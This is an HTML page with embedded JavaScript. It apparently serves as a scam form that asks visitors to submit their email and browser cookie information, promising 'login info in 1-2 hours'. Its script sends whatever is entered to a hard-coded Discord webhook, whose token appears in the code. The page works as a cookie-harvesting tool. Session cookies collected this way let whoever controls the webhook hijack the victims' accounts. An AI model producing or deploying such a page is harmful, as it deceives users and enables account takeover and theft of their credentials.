<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Send Cookie to Discord Webhook</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #2b2b2b;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    form {
      background: #444;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0, 255, 153, 0.7);
    }
    input, textarea {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      background: #333;
      color: white;
      border: 1px solid #555;
      border-radius: 5px;
      font-size: 16px;
    }
    button {
      margin-top: 15px;
      padding: 10px 20px;
      background-color: #00ff99;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      color: #000;
      font-weight: bold;
      font-size: 16px;
    }
    button:hover {
      background-color: #009966;
    }
    .notice {
      font-size: 0.8rem;
      margin-top: 10px;
      color: #aaa;
    }
  </style>
</head>
<body>

  <h1>Send Your Cookie to Discord</h1>
  <form id="cookie-form">
    <input type="email" id="email" placeholder="Enter Email" required />
    <textarea id="cookie" rows="4" placeholder="Enter Cookie Information" required></textarea>
    <button type="submit">Send</button>
    <div class="notice">You will receive the login info in 1-2 hours.</div>
  </form>

  <script>
    const form = document.getElementById('cookie-form');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const cookie = document.getElementById('cookie').value;

      const webhookUrl = 'https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT'; // Your webhook URL here

      const payload = {
        content: `üì¨ New Cookie Submission\nüìß Email: ${email}\nüç™ Cookie: ${cookie}`
      };

      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          alert('Cookie has been sent successfully!');
          form.reset();
        } else {
          alert('Something went wrong, please try again.');
        }
      } catch (err) {
        alert('Error sending the cookie.');
        console.error(err);
      }
    });
  </script>

</body>
</html>
